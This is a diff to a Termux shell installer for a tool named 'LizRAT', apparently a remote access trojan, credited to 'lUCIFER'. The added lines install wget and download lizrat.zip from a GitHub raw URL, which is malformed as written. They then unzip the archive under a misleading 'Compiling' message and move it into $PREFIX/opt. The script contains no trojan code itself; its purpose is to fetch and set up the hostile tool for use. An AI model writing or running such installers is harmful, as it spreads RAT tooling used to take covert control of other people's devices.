@@ -21,6 +21,7 @@ echo "${GRN}PRESS 'Y' When ASKED then PRESS ENTER${NC}"
 sleep 5
 
 pkg update && pkg upgrade
+pkg install wget -y
 clear
 
 echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
@@ -32,17 +33,31 @@ echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━
 echo "${CYN}                                  By lUCIFER   ${NC}"
 
 if [ ! -d "$PREFIX/opt" ]; then
-  echo "${BLUE}Creating /usr/opt Directory${NC}"
+  echo "${BLUE}Setting UP LzRAT${NC}"
   mkdir "$PREFIX/opt"
   echo "${GREEN}Directory created${NC}"
 fi
 sleep 3
 if [ -d "$PREFIX/opt/lizrat" ]; then
-  echo "${CYAN}Removing existing lizrat directory${NC}"
+  echo "${CYAN}Existing lizrat directory Found! Removing it${NC}"
   rm -rf "$PREFIX/opt/lizrat"
 fi
 sleep 5
 
+file="lizrat.zip"
+
+if [ -e "$file" ]; then
+  echo "${GREEN}File $file exists.${NC}"
+else
+  echo "${GREEN}$file does not exist. Downloading...${NC}"
+  wget -q "https:raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/lizrat.zip" 
+fi
+sleep 5
+
+clear
+echo "${GREEN}Compiling LizRat${NC}"
+sleep 6
+unzip lizrat.zip
 clear
 
 echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
@@ -53,9 +68,9 @@ echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣
 echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
 echo "${CYN}                                  By lUCIFER   ${NC}"
 
-echo "${YLW}Moving lizrat directory to /usr/opt${NC}"
+echo "${YLW}Setting UP Directories${NC}"
 mv -f lizrat "$PREFIX/opt"
-echo "${GRN}lizrat directory Moved${NC}"
+echo "${GRN}Directory SETUP Complete${NC}"
 sleep 5
 clear
 
